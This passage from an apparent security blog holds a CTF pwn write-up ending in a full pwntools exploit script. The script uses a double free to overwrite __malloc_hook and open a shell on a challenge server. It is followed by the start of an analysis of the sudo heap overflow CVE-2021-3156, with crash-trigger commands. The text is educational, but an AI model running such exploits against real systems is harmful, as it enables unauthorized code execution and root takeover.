protocol\nvars0[0]: protocol’s magic (0x1234567812345678)\nvars0[1]: strlen(source string) + 0x28\nvars0[2]: store qword_203100, value is 8, this value we can change.\nvars0[3]: strlen(source string)\nvars0[4]: header’s end flag of protocol, (0x4141414141414141)\nThen source string will copy to end after vars0[4] and encoded with base64.\nNow we can write decode function to decode what this program print.\ndef dec(d):    p = base64.b64decode(d)    return p[0x28:]\n\nIt’s too easy, just use base64 decode what this program print, then cuts header data off, let body data return.\nWritting encode function to encode what we want input. but we have to analyse dec_input function.\ndec_input function pseudo code as follows.\nconst char *sub_1070()&#123;  __int64 i; // rax  __int64 j; // rbp  double v2; // xmm2_8  double v3; // xmm1_8  __int64 k; // rbp  int v5; // eax  double v6; // xmm1_8  size_t size_; // rdi  __int64 v8; // r12  void *v9; // rax  int v10; // eax  double v11; // xmm1_8  double v12; // xmm0_8  __int64 v13; // rax  void *v14; // rsi  __int64 l; // rax  __int64 v16; // rax  char *v18; // rdi  __int64 v19[2]; // [rsp+10h] [rbp-5058h]  __int64 v20[2]; // [rsp+20h] [rbp-5048h]  char buf[4096]; // [rsp+30h] [rbp-5038h] BYREF  char str[8192]; // [rsp+1030h] [rbp-4038h] BYREF  char v23[32]; // [rsp+3030h] [rbp-2038h] BYREF  char v24[8160]; // [rsp+3050h] [rbp-2018h] BYREF  unsigned __int64 v25; // [rsp+5038h] [rbp-30h]  char v26[40]; // [rsp+5040h] [rbp-28h] BYREF  v25 = __readfsqword(0x28u);  memset(buf, 0, sizeof(buf));  read(0, buf, 0x1000uLL);  memset(str, 0, sizeof(str));  base64_dec((unsigned __int8 *)buf, strlen(buf), (__int64)str);  v19[0] = 0x1234567812345678LL;  for ( i = 0LL; i != 8; ++i )                  // check magic  &#123;    if ( *((_BYTE *)v19 + i) != str[i] )    &#123;      v18 = &quot;Illegal Magic!&quot;;      goto ERROR;                               // check_magic... goto error    &#125;  &#125;  qword_2030C8 = 0LL;  for ( j = 0LL; j != 8; ++j )                  // calc vars[1]: strlen(source string) + 0x28  &#123;    v2 = (double)str[j + 8];    v3 = (double)(int)j;    qword_2030C8 = (unsigned int)(int)(pow(256.0, v3) * v2 + (double)(int)qword_2030C8);  &#125;  sz = 0LL;  for ( k = 0LL; k != 8; ++k )                  // vars[2]: defualt value is 8, this value we can control malloc size  &#123;    v5 = str[k + 16];    v6 = (double)(int)k;    size_ = (unsigned int)(int)(pow(256.0, v6) * (double)v5 + (double)(int)sz);    sz = size_;  &#125;  v8 = 0LL;  v9 = malloc(size_);  qword_2030D8 = 0LL;  data_buf = v9;  do  &#123;                                             // vars[3]: strlen(source string)    v10 = str[v8 + 0x18];    v11 = (double)(int)v8++;    v12 = pow(256.0, v11) * (double)v10 + (double)(int)qword_2030D8;    qword_2030D8 = (unsigned int)(int)v12;  &#125;  while ( v8 != 8 );  global_ptr = calloc((unsigned int)(int)v12, 1uLL);  if ( qword_2030C8 != (unsigned int)(int)v12 + sz + 0x20 )// check_size  &#123;    v18 = &quot;Illegal Head!&quot;;ERROR:    enc_print(v18);    free(global_ptr);    free(data_buf);    return &quot;ERROR&quot;;  &#125;  v20[0] = 0x4141414141414141LL;  if ( sz &gt; 0 )                                 // copy data to data_buf  &#123;    v13 = 0LL;    do    &#123;      *((_BYTE *)data_buf + v13) = str[v13 + 0x20];      ++v13;    &#125;    while ( sz &gt; v13 );  &#125;  v14 = data_buf;  for ( l = 0LL; l != 8; ++l )                  // check end flag of protocol  &#123;    if ( *((_BYTE *)v20 + l) != *((_BYTE *)data_buf + l) )    &#123;      strcpy(v23, &quot;Illegal Key!Your key is &quot;);      memset(v24, 0, sizeof(v24));      _strcpy_chk((__int64)&amp;v23[24], (__int64)data_buf, 0x2000LL);      v18 = v23;      goto ERROR;    &#125;  &#125;  if ( qword_2030D8 &gt; 0 )  &#123;    v16 = 0LL;    do    &#123;      *((_BYTE *)global_ptr + v16) = v26[v16 - 0x3FF0 + sz];      ++v16;    &#125;    while ( qword_2030D8 &gt; v16 );    v14 = data_buf;  &#125;  free(v14);  return (const char *)global_ptr;&#125;\n\nWe can learn a lot from this function. because some especial data in header of protocol is very important, that can control malloc and calloc memory’s size, and some information can result parsing protocol error.\nSo we can write a encode function as follows:\ndef enc(d, ca_sz = -1, ma_sz = 8, ends = b&#x27;A&#x27; * 8):    if(ca_sz == -1):        ca_sz = len(d)    p  = p64(0x1234567812345678) # vars[0]: magic    p += p64(ca_sz + ma_sz + 0x20)  # vars[1]: size    p += p64(ma_sz) # vars[2]: control malloc(size), data_buf    p += p64(ca_sz) # vars[3]: strlen(source string), that can control calloc size    # through the check function    # we must make vars[1] == vars[2] + vars[3]    p += ends  # end flags of protocol    p += d    p = base64.b64encode(p)    return p\n\n\n\n\n\nExploitingHow can we exploit? \nFirst we should leak the libc, modify __malloc_hook as one_gadget  by some ways, when we call malloc, then we can get shell.\nHow we do that?\nWe don’t know remote version what it is. we have to leak libc information by some vulnerability. I just use a normal way, then the program crashed with double free.\nnew(0x60, b&#x27;B&#x27; * 0x60)\n\nDumpping information as follows:\nb&#x27;eFY0EnhWNBI1AAAAAAAAAAgAAAAAAAAADQAAAAAAAABBQUFBQUFBQUlsbGVnYWwgSGVhZCE=\\n&#x27;    b&quot;*** Error in `./pwn&#x27;: double free or corruption (fasttop): 0x000055dcf13a6280 ***\\n&quot;    b&#x27;======= Backtrace: =========\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f54311e47f5]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x8038a)[0x7f54311ed38a]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f54311f158c]\\n&#x27;    b&#x27;./pwn(+0xd15)[0x55dcef7f6d15]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f543118d840]\\n&#x27;    b&#x27;./pwn(+0xdc9)[0x55dcef7f6dc9]\\n&#x27;    b&#x27;======= Memory map: ========\\n&#x27;\n\nWe can calculate __libc_start_main address, that is 0x7f543118d840 - 0xf0, last 3 hex is 0x750. Use this website to find this libc and download it.\nhttps://libc.blukat.me/\nHow to leak libc base address?\nUsing big unsorted bin can easily leak libc. We just malloc a big chunk, then free, when we next malloc our chunk\nWe can print main_arena address at our chunk\n# malloc big size chuckru(&#x27;jZSA/Pg==\\n&#x27;)d = enc(b&#x27;&#x27;, 0x18, 0x400) # set calloc size as 0x18, malloc size as 0x400s(d)new(0x68, b&#x27;\\x78&#x27;) # malloc our chunk, then print it, that will leak main_arena addressr = dp()leak = u64(r.ljust(8, b&#x27;\\x00&#x27;))libc_base = leak - libc.sym[&#x27;__malloc_hook&#x27;] - 0x10 - 88one_gadget = libc_base + 0xf1207 # Use one_gaget tools to find it__malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]li(&#x27;libc_base: &#x27; + hex(libc_base))\n\n\n\nI debugged this program, I found have a lot min chunk to confusion layout of heap, so use heap overflow vulnerability not easily to control heap chunks. \nBut I found a double free vulnerability in this program. \nIn dec_input function\nERROR:    enc_print(v18);    free(global_ptr);    free(data_buf);    return &quot;ERROR&quot;;  &#125;\n\nIn main function\n v3 = dec_input();        if ( !strcmp(v3, &quot;ERROR&quot;) )        &#123;          free(global_ptr);          exit(0);        &#125;...        enc_print(&quot;Size &gt;&gt;&quot;);        v5 = dec_input();        size = strtol(v5, 0LL, 10);        free(global_ptr);...\n\nIf we make an error in dec_input function, then will trigger double free vulnerability.\nfree(global_ptr) -&gt; free(data_buf) -&gt; free(global_ptr).\nWe don’t want exit when trigging this double free vulnerability, so input size at New  statements can realize it.\nHow can we set double free?\nBecause we can control the global_ptr chunk size and data_buf chunk size by modifing protocol header.\nvars[2]: control malloc(size), data_bufvars[3]: strlen(source string), that can control calloc size\n\nWe want modify fastbin chunk’s fd  pointing to __malloc_hook- 0x23 , malloc size and calloc size need to satisfy 0x60 ~ 0x68.\nMake uaf, when we input size at New statments, we set ends flag is error, so free(global_ptr) -&gt; free(data_buf) -&gt; free(global_ptr)\nru(&#x27;jZSA/Pg==\\n&#x27;)   s(enc(b&#x27;1&#x27;)) # set malloc size as 0x400   print(dec(rl()))   s(enc(b&#x27;A&#x27;, 0x68, 0x68, b&#x27;B&#x27; * 8))\n\ndebugging info: 0x70: 0x562c99a567a0 —▸ 0x562c99a56730 ◂— 0x562c99a567a0\nNext, we just malloc(0x68), set contents as __malloc_hook - 0x23. So we modified the fastbin fd as our target address\n   new(0x68, p64(__malloc_hook - 0x23))\n\ndebugging info: 0x70: 0x5596226f6730 —▸ 0x5596226f67a0 —▸ 0x7f7baf0a6aed (_IO_wide_data_0+301)\nLoop malloc(0x68) until malloc to __malloc_hook - 0x23, modify __malloc_hook as one_gadget,  we can get shell when next call malloc\nnew(0x68, p64(0))   # debugging info: 0x70: 0x5651ddce97a0 —▸ 0x7faba905daed (_IO_wide_data_0+301)   new(0x68, p64(0))   # debugging info: 0x70: 0x7ff0b226daed (_IO_wide_data_0+301)   # Malloc memory to target chunk   # Trigger get shell   new(0x68, b&#x27;A&#x27; * 0x13 + p64(one_gadget))\n\nexpThe full exp is as follows\n#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import base64import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = False)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.arch = &#x27;amd64&#x27;elf_path  = &#x27;pwn&#x27;# remote server ip and porthost = &quot;8.140.179.11:13452&quot;# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def enc(d, ca_sz = -1, ma_sz = 8, ends = b&#x27;A&#x27; * 8):    if(ca_sz == -1):        ca_sz = len(d)    p  = p64(0x1234567812345678) # vars[0]: magic    p += p64(ca_sz + ma_sz + 0x20)  # vars[1]: size    p += p64(ma_sz) # vars[2]: control malloc(size), data_buf    p += p64(ca_sz) # vars[3]: strlen(source string), that can control calloc size    # through the check function    # we must make vars[1] == vars[2] + vars[3]    p += ends  # end flags of protocol    p += d    p = base64.b64encode(p)    return pdef dec(d):    p = base64.b64decode(d)    return p[0x28:] # Remove header info, return body datadef db():    if(LOCAL):        gdb.attach(io)def new(sz, d):    ru(&#x27;jZSA/Pg==\\n&#x27;)    s(enc(b&#x27;1&#x27;))    print(dec(rl()))    s(enc(str(sz).encode()))    print(dec(rl()))    s(enc(d))def rm():    ru(&#x27;jZSA/Pg==\\n&#x27;)    s(enc(b&#x27;2&#x27;))def md(d):    ru(&#x27;jZSA/Pg==\\n&#x27;)    s(enc(b&#x27;3&#x27;))    print(dec(rl()))    s(enc(d))def dp():    ru(&#x27;jZSA/Pg==\\n&#x27;)    s(enc(b&#x27;4&#x27;))    return dec(rl())def dump_libc_version():    #Dump remote libc, because trrger double free.    #/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8b4a8ea840]    # libc6_2.23-0ubuntu11.2_amd64    new(0x60, b&#x27;B&#x27; * 0x60)#--------------------------exploit--------------------------def exploit():    li(&#x27;exploit...&#x27;)    # Dump libc version, I dumped it, the version is 2.23    #dump_libc_version()    # Leak libc base    # We just malloc a big chunk, then free, when we next malloc our chunk,    # We can print main_arena address at our chunk    # malloc big size chuck    ru(&#x27;jZSA/Pg==\\n&#x27;)    d = enc(b&#x27;&#x27;, 0x18, 0x400) # set malloc size as 0x400    s(d)    new(0x68, b&#x27;\\x78&#x27;) # malloc our chunk, then print it, that will leak main_arena address    r = dp()    leak = u64(r.ljust(8, b&#x27;\\x00&#x27;))    libc_base = leak - libc.sym[&#x27;__malloc_hook&#x27;] - 0x10 - 88    one_gadget = libc_base + 0xf1207 # Use one_gaget tools to find it    __malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]    li(&#x27;libc_base: &#x27; + hex(libc_base))    li(&#x27;__malloc_hook: &#x27; + hex(__malloc_hook))    li(&#x27;one_gadget: &#x27; + hex(one_gadget))    # Now we can use usf vulnerability to modify fastbin fd to __malloc_hook - 0x23    # So when we next malloc(0x70) memory, we can modify __malloc_hook buffer as one_gadget    # If we make dec_input return ERROR, so there is a obvious uaf vuln.    # If we wannt use this uaf vuln, we should malloc to our target address, so when we freed    # chunk, so next we must malloc to it, rather than exit this program        # Make uaf, when we input size at New statments, we set ends flag is error, so free(global_ptr) -&gt; free(data_buf) -&gt; free(global_ptr)    ru(&#x27;jZSA/Pg==\\n&#x27;)    s(enc(b&#x27;1&#x27;)) # set malloc size as 0x400    print(dec(rl()))    s(enc(b&#x27;A&#x27;, 0x68, 0x68, b&#x27;B&#x27; * 8))    # debugging info: 0x70: 0x562c99a567a0 —▸ 0x562c99a56730 ◂— 0x562c99a567a0    # Next, we just malloc(0x68), set contents as __malloc_hook - 0x23. So we modified the fastbin fd as our target address    new(0x68, p64(__malloc_hook - 0x23))    # debugging info: 0x70: 0x5596226f6730 —▸ 0x5596226f67a0 —▸ 0x7f7baf0a6aed (_IO_wide_data_0+301)    new(0x68, p64(0))    # debugging info: 0x70: 0x5651ddce97a0 —▸ 0x7faba905daed (_IO_wide_data_0+301)    new(0x68, p64(0))    # debugging info: 0x70: 0x7ff0b226daed (_IO_wide_data_0+301)    # Malloc memory to target chunk    # Trigger    new(0x68, b&#x27;A&#x27; * 0x13 + p64(one_gadget))        def finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    if LOCAL:        libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;        elf = ELF(elf_path)        if LIBC:            libc = ELF(libc_path)        io = elf.process()    else:        libc_path = &#x27;./libc6_2.23-0ubuntu11.2_amd64.so&#x27;        elf = ELF(elf_path)        io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))        if LIBC:            libc = ELF(libc_path)    exploit()    finish()\n\n\n\noutputs:\n    b&#x27;./getflag\\n&#x27;[DEBUG] Received 0x37 bytes:    00000000  1b 5b 34 37  3b 33 31 3b  35 6d 43 6f  6e 67 72 61  │·[47│;31;│5mCo│ngra│    00000010  74 75 6c 61  74 69 6f 6e  73 2c 70 6c  65 61 73 65  │tula│tion│s,pl│ease│    00000020  20 69 6e 70  75 74 20 79  6f 75 72 20  74 6f 6b 65  │ inp│ut y│our │toke│    00000030  6e 3a 1b 5b  30 6d 20                               │n:·[│0m │    00000037Congratulations,please input your token: $\n\n\n\nLast: There are some questions helped by: flzx3qc, cnitlrt\nReverseThis direction of ctf, I want use my free time to resolove these challenges. This paper will conntinue to update.\n","categories":["ctf"],"tags":["pwn"]},{"title":"Heap-Based Buffer Overflow in Sudo","url":"/2021/04/01/security/cve/CVE-2021-3156/","content":"CVE-2021-3156: Heap-Based Buffer Overflow in SudoIntroThis CVE almost impact on all distributions of linux, every common user can use this vulnerability  escaped permission as root. Disclosured at 2021-01-13. We have a ctf match (hws) at 2021-02, there is a pwn challenge can use this vulnerability to escape permission as root, but I don’t use this CVE to realize it. Just  use CVE-2019-14287 easily to get root. At that time, I knew this CVE, but I didn’t want explore the  background technologes. Now, this paper will analyse this vulnerability and let’s to exploit it.\nWhat versions are vulnerable?\nThe following versions of sudo are vulnerable:\n\nAll legacy versions from 1.8.2 to 1.8.31p2\nAll stable versions from 1.9.0 to 1.9.5p1\n\nsudo official website: https://www.sudo.ws/\nCheck if you are affectedLogin as non-root user\nMethod 1Run a command as follow to check.\nsudoedit -s &#x27;aaaaaaaaaaaaaaaaa\\&#x27;\n\nIf you receive a usage or error message, sudo is not vulnerable. If the result is a Segmentation fault, sudo is vulnerable. As you can see below:\nmalloc(): memory corruptionAborted (core dumped)\n\nMethod 2Coming from official judge method (Not recommend!)\nRun command sudoedit -s /\nIf the system is vulnerable, it will response with an error that starts with “sudoedit”\nIf the system is not vulnerable, it will response with an error that starts with “usage”\n[i0gan@arch ~]$ sudoedit -s / usage: sudoedit [-AknS] [-C num] [-D directory] [-g group] [-h host] [-p prompt] [-R directory] [-T timeout] [-u user]                file ...\n\nBut I try it, this dosen’t work, I cannot use this method to judge if my system is vulnerable. becuase I test on my latest sudo, this version has been patched, I use this method to test,the result is correct. when I test on my vulnerable system. it dosen’t show “sudoedit”, instead let me input password. So I recommend tester to use method 1 to test your linux system.\nPrepare ENVMy sudo version and operation system version information as follows.\nsudo --versionSudo version 1.8.21p2Sudoers policy plugin version 1.8.21p2Sudoers file grammar version 46Sudoers I/O plugin version 1.8.21p2cat /proc/versionLinux version 5.3.0-28-generic (buildd@lcy01-amd64-009) (gcc version 7.4.0 (Ubuntu 7.4.0-1ubuntu1~18.04.1)) #30~18.04.1-Ubuntu SMP Fri Jan 17 06:14:09 UTC 2020\n\nMy vulnerable system is ubuntu 18.04.1 and operation system is ubuntu~18.04.1\nI test version is 1.8.21p2.  We should download source code to analyse this vulnerability. You can download source code of 1.8.21p2 version here.\nDownload \nIf we downloaded source code, we can open NEWS file learn historic vulnerabilities : ). There are so many bug we can learn. Nice!!!\nNow we must to dynamic debugging sudo program, some tools we will used.\ngdb + pwndbg plugin   — Debugging sudo program\ngcc  — Compile our C exploit script to ELF binary\nIf your prepared tools above, now starting our journey. Last set your linux system sudo program version as 1.8.21p2. \ninstall step\n./configuremakesudo make install\n\n\n\nHole Technical AnalysisThis vulnerability is discovered by fuzz, So we have to explore how is it crashed. sudo allows users to run programs with the security previleges of another user. sudoedit is a built-in command of sudo that allows users to securely edit files. In this new fulnerability, Qualys researchers discovered that when running sudoedit whth flags -s or -i, the command will not result exit with an error, and the sudoers policy plugin will not remove the escape characters, resulting instead in reading beyond the last of a string. if it ends with an un-escaped backslash character. May allow attackers to exploit this vulnerability in order to run arbitrary code execution with root privilege without authentication.\nTest what arguments in running programs\n#include&lt;stdio.h&gt;int main(int argc, char* argv[]) &#123;\tprintf(&quot;%s\\n&quot;, argv[1]);\treturn 0;&#125;\n\noutputs:\n./a.out &#x27;AAAAAAAAA\\&#x27;AAAAAAAAA\\\n\n\n\n#! /bin/bashargs=`echo -e &#x27;AAAAAAAAA\\&#x27;`echo &quot;sudoedit -s $args&quot;sudoedit -s $args\n\noutputs:\n./tsudoedit -s AAAAAAAAA\\malloc(): memory corruption./t: line 4:  8832 Aborted                 (core dumped) sudoedit -s $args\n\nSo arguments is AAAAAAAAA\\\nThis version, if sudo is executed to run a command in shell mode . through the -s option\n or through -i option sets sudo’s MODE_SHELL and MODE_LOGIN_SHELL flags. \nparse_args function used for parse program arguments\nsrc&#x2F;sudo.c: 193 in main() function\n/* Parse command line arguments. */sudo_mode = parse_args(argc, argv, &amp;nargc, &amp;nargv, &amp;settings, &amp;env_add);sudo_debug_printf(SUDO_DEBUG_DEBUG, &quot;sudo_mode %d&quot;, sudo_mode); \n\nif we set flags as MODE_SHELL, we can enter shell mode, that can rewrite argv.\nBy concatenating all command-line arguments and by escaping all meta-characters with backslashes\nsrc&#x2F;parse_args.c : 528 in  parse_args() function\n/*   * For shell mode we need to rewrite argv */if (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;char **av, *cmnd = NULL;int ac = 1;if (argc != 0) &#123;    /* shell -c &quot;command&quot; */    char *src, *dst;    // command size    size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) +    strlen(argv[argc - 1]) + 1;    cmnd = dst = reallocarray(NULL, cmnd_size, 2); // malloc mem to store command    if (cmnd == NULL)    sudo_fatalx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;));    if (!gc_add(GC_PTR, cmnd))    exit(1);    // By concatenating all command-line arguments     for (av = argv; *av != NULL; av++) &#123;    for (src = *av; *src != &#x27;\\0&#x27;; src++) &#123; // get one commands        /* quote potential meta characters */        if (!isalnum((unsigned char)*src) &amp;&amp; *src != &#x27;_&#x27; &amp;&amp; *src != &#x27;-&#x27; &amp;&amp; *src != &#x27;$&#x27;)        *dst++ = &#x27;\\\\&#x27;; // Escaping all meta-characters with backslashes, that can make a easy heap overflow        *dst++ = *src;    &#125;       *dst++ = &#x27; &#x27;;    &#125;       if (cmnd != dst)    dst--;  /* replace last space with a NUL */    *dst = &#x27;\\0&#x27;;    ac += 2; /* -c cmnd */&#125;av = reallocarray(NULL, ac + 1, sizeof(char *));if (av == NULL)                                                                                                                                                                                                                                              sudo_fatalx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;));if (!gc_add(GC_PTR, av))    exit(1);av[0] = (char *)user_details.shell; /* plugin may override shell */if (cmnd != NULL) &#123;    av[1] = &quot;-c&quot;;    av[2] = cmnd;&#125;   av[ac] = NULL;argv = av; argc = ac; &#125;\n\n\n\nNow we debugging this sudoedit program, copy this file to current directory from &#x2F;usr&#x2F;bin&#x2F;sudoedit, use IDA or Cutter to analyse it.\nI use IDA 7.5 to decompile it, we should find parse_args function. because this program haven’t parse_args function symbol, I have to find this parse_args function by self according main argc arguments.\nif ( (unsigned __int8)sudo_conf_disable_coredump_v1() )  sub_14E00(0LL);dword_2250C0 = sub_11760((int)v4, a2, (int *)&amp;v171, &amp;v172, &amp;v177, &amp;v173);sudo_debug_printf2_v1(  &quot;main&quot;,  &quot;../../src/sudo.c&quot;,  194LL,  456LL,  &quot;sudo_mode %d&quot;,  (unsigned int)dword_2250C0);\n\nBecause v2 is main function argc argument, so I easily found sub_11760, it is parse_args function.\nFound above source’s pseudo code as follow.\nLABEL_100:  if ( (v122 &amp; 1) == 0 || (v123 &amp; 0x20000) == 0 ) // flags    goto LABEL_128;  if ( v38 )  &#123;    v41 = v36[v38 - 1];    v42 = strlen(v41);    v43 = reallocarray(0LL, v42 + v41 - *v36 + 1, 2LL);    v44 = (_BYTE *)v43;    if ( !v43 )    &#123;      sudo_warn_gettext_v1(0LL, &quot;unable to allocate memory&quot;);      v106 = (const char *)sudo_warn_gettext_v1(0LL, &quot;%s: %s&quot;, v104, v105);      sudo_debug_printf2_v1(&quot;parse_args&quot;, &quot;../../src/parse_args.c&quot;, 540LL, 98LL, v106);      goto LABEL_153;    &#125; ...\n\nWe just to know address of this part for debugging.\nshow asm\n.text:0000000000011F4A                 test    [rsp+0E8h+var_D8], 20000h.text:0000000000011F52                 jz      loc_121DB.text:0000000000011F58                 test    ebx, ebx.text:0000000000011F5A                 jz      loc_1217B.text:0000000000011F60                 movsxd  rbx, ebx.text:0000000000011F63                 mov     rbx, [r14+rbx*8-8].text:0000000000011F68                 mov     rdi, rbx        ; s.text:0000000000011F6B                 call    _strlen.text:0000000000011F70                 sub     rbx, [r14].text:0000000000011F73                 xor     edi, edi.text:0000000000011F75                 mov     edx, 2.text:0000000000011F7A                 lea     rsi, [rax+rbx+1].text:0000000000011F7F                 call    _reallocarray\n\nThe parse_args function offset is 0x11760\n0x11760-&gt; 0x118B0 -&gt; 0x5674\nNow we can set breakpoint at  ELF_BASE_ADDRESS + 0x11760 ( parse_args ) to debugging sudoedit program.\nWhen I debugging, I don’t know why this program haven’t enter above code. \nContinue to read blog @_@ … \nThe author say: In sudoders_policy_main(), set_cmnd() concatenates the command-line arguements into a heap-based buffer. user_args and unescapes the meta-characters (for sudoers matching and logging purposes). These functions are at plugins&#x2F;sudoers&#x2F;sudoers.c. \nplugins&#x2F;sudoers&#x2F;sudoers.c in set_cmnd() function \n/* * Fill in user_cmnd, user_args, user_base and user_stat variables * and apply any command-specific defaults entries. */static intset_cmnd(void) // vulnerable function&#123;    int ret = FOUND;    char *path = user_path;    debug_decl(set_cmnd, SUDOERS_DEBUG_PLUGIN)    /* Allocate user_stat for find_path() and match functions. */    user_stat = calloc(1, sizeof(struct stat));    if (user_stat == NULL) &#123;    sudo_warnx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;));    debug_return_int(NOT_FOUND_ERROR);    &#125;    /* Default value for cmnd, overridden below. */    if (user_cmnd == NULL)    user_cmnd = NewArgv[0];    if (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123;    if (ISSET(sudo_mode, MODE_RUN | MODE_CHECK)) &#123;        if (def_secure_path &amp;&amp; !user_is_exempt())        path = def_secure_path;        if (!set_perms(PERM_RUNAS))        debug_return_int(-1);        ret = find_path(NewArgv[0], &amp;user_cmnd, user_stat, path,        def_ignore_dot, NULL);        if (!restore_perms())        debug_return_int(-1);        if (ret == NOT_FOUND) &#123;        /* Failed as root, try as invoking user. */        if (!set_perms(PERM_USER))            debug_return_int(-1);        ret = find_path(NewArgv[0], &amp;user_cmnd, user_stat, path,            def_ignore_dot, NULL);        if (!restore_perms())            debug_return_int(-1);        &#125;        if (ret == NOT_FOUND_ERROR) &#123;        if (errno == ENAMETOOLONG)            audit_failure(NewArgc, NewArgv, N_(&quot;command too long&quot;));        log_warning(0, &quot;%s&quot;, NewArgv[0]);        debug_return_int(ret);        &#125;    &#125;    /* set user_args */    if (NewArgc &gt; 1) &#123;        char *to, *from, **av;        size_t size, n;        /* Alloc and build up user_args. */        for (size = 0, av = NewArgv + 1; *av; av++)        size += strlen(*av) + 1;        if (size == 0 || (user_args = malloc(size)) == NULL) &#123;        sudo_warnx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;));        debug_return_int(-1);        &#125;        if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;        /*         * When running a command via a shell, the sudo front-end         * escapes potential meta chars.  We unescape non-spaces         * for sudoers matching and logging purposes.         */        for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123;            while (*from) &#123; // vulnerability: if command-line == &#x27;\\&#x27;            // form [0] == &#x27;\\\\&#x27; &amp;&amp; form[1] == &#x27;\\x00&#x27;            if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1]))                from++;            *to++ = *from++; // copy data to user_args, form pointer add again, out of range            &#125;             *to++ = &#x27; &#x27;;        &#125;        *--to = &#x27;\\0&#x27;;        &#125; else &#123;        for (to = user_args, av = NewArgv + 1; *av; av++) &#123;            n = strlcpy(to, *av, size - (to - user_args));            if (n &gt;= size - (to - user_args)) &#123;            sudo_warnx(U_(&quot;internal error, %s overflow&quot;), __func__);            debug_return_int(-1);            &#125;            to += n;            *to++ = &#x27; &#x27;;        &#125;        *--to = &#x27;\\0&#x27;;        &#125;    &#125;    &#125;    if ((user_base = strrchr(user_cmnd, &#x27;/&#x27;)) != NULL)    user_base++;    else    user_base = user_cmnd;    if (!update_defaults(SETDEF_CMND, false)) &#123;    log_warningx(SLOG_SEND_MAIL|SLOG_NO_STDERR,        N_(&quot;problem with defaults entries&quot;));    &#125;    debug_return_int(ret);&#125;\n\nIf a command-line argument ends with a signle backslash character, then form[0] is a backslash character, and form[1] is ‘\\x00’  (is not space character)\nform is incremented and points to the null terminator (‘\\x00’);\nThe null terminator is copied to the user_args buffer, the form is incremented again and points to the first character after the null terminator. (out of arguments’ bounds). The whill loop reads and copies out of bounds characters to the user_args buffer.\nSo, In the words, set_cmnd is a vulnerable function. There is a heap-based buffer overflow vulnerability.\nThat copy out of bounds data to the user_args buffer, and not sure how much copied it is. when we exploit, we can use ‘\\00’ to terminate coping.\nNow how we trigger this vulnerability? \nif (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL))\n\nwe should set sudo_mode as MODE_SHELL and MODE_LOGIN_SHELL \nIt is necessary condition for reaching the vulnerable code. parse_args function can do that, but this function already escaped all meta-characters (i.e., it escaped every single backslash with a second backslash). so including more backslashes, that cannot trigger vuln.\nFound a loophole:\nif we execute sudo as sudoedit instead of sudo, then parse_args() automatically sets sudo_mode as  MODE_EDIT,  but does not reset valid_flags, and the valid_flags include MODE_SHELL by default.\nIf we execute sudoedit -s, then we set both MODE_EDIT and MODE_SHELL (but not MODE_RUN), we avoid the escape code, reach the vulnerable code, and overflow the heap-based buffer user_args through a command-line argument that ends with a single backslash character.\nTesting heap overflow, we use gdb to test it.\nHow to exploit?gdb.sh\n#! /bin/bashsudo gdb /usr/bin/sudoedit \\    -ex &quot;set args -s &#x27;AAAAAAAAAAAABBBBBBB\\&#x27;&quot;\n\nRun gdb.sh\n./gdb.sh\n\nInput run, heap in gdb program\n0x55791f9b40a0 FASTBIN &#123;  mchunk_prev_size = 0,  mchunk_size = 33,  fd = 0x4141414141414141,  bk = 0x4242424241414141,  fd_nextsize = 0x435f534c00424242,  bk_nextsize = 0x73723d53524f4c4f&#125;Exception occurred: malloc_chunk: Cannot access memory at address 0x55791f900000 (&lt;class &#x27;gdb.MemoryError&#x27;&gt;)For more info invoke `set exception-verbose on` and rerun the commandor debug it by yourself with `set exception-debugger on`&#x27;heap&#x27;: Prints out chunks starting from the address specified by `addr`.\n\nShow memory.\npwndbg&gt; x /40gx 